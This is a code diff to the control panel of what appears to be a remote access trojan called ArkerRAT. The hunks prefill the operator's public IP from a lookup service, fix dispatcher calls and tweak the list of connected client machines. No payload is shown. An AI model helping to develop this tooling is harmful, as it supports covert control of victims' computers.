@@ -39,6 +39,31 @@ namespace ArkerRAT1
             updateThread.Start();
             this.WindowState = WindowState.Normal;
             this.Activate();
+
+            //Assing the standard IP
+            Task.Run(() =>
+            {
+                    try
+                    {
+                        string address = "";
+                        WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
+                        using (WebResponse response = request.GetResponse())
+                        using (StreamReader stream = new StreamReader(response.GetResponseStream()))
+                        {
+                            address = stream.ReadToEnd();
+                        }
+
+                        int first = address.IndexOf("Address: ") + 9;
+                        int last = address.LastIndexOf("</body>");
+                        address = address.Substring(first, last - first);
+                        Application.Current.Dispatcher.BeginInvoke((Action)(() =>
+                        {
+                            iPInput.Text = address;
+                        }));
+                    }
+                    catch (Exception ex){}
+            });
+            
         }
 
         int oldCount = 0;
@@ -49,7 +74,7 @@ namespace ArkerRAT1
                 if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                 {
                     oldCount = ArkerRATServerMechanics.rATClients.Count();
-                    this.Dispatcher.BeginInvoke(new Action(() =>
+                    Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                     {
                         clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
                         serverAmountLabel.Content = 0;
@@ -186,7 +211,6 @@ namespace ArkerRAT1
                 ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
                 ArkerRATServerMechanics.StartServer();
             }
-
         }
 
         private async void RemoveServer(object sender, RoutedEventArgs e)
@@ -271,7 +295,7 @@ namespace ArkerRAT1
                 ArkerRATServerMechanics.rATClients[y].clientButton.BorderBrush = new SolidColorBrush(arkerPurple);
                 ArkerRATServerMechanics.rATClients[y].clientButton.Foreground = new SolidColorBrush(arkerPurple);
                 ArkerRATServerMechanics.rATClients[y].clientButton.Background = new SolidColorBrush(arkerGrey);
-                ArkerRATServerMechanics.rATClients[y].clientButton.Content = ArkerRATServerMechanics.rATClients[y].clientInfo + "                            " + ArkerRATServerMechanics.rATClients[y].ms + "ms";
+                ArkerRATServerMechanics.rATClients[y].clientButton.Content = ArkerRATServerMechanics.rATClients[y].clientInfo + "\t" + ArkerRATServerMechanics.rATClients[y].ms + "ms";
                 loadClients.Items.Add(ArkerRATServerMechanics.rATClients[y].clientButton);
                 CyperTools(ArkerRATServerMechanics.rATClients[y].clientButton);
             }
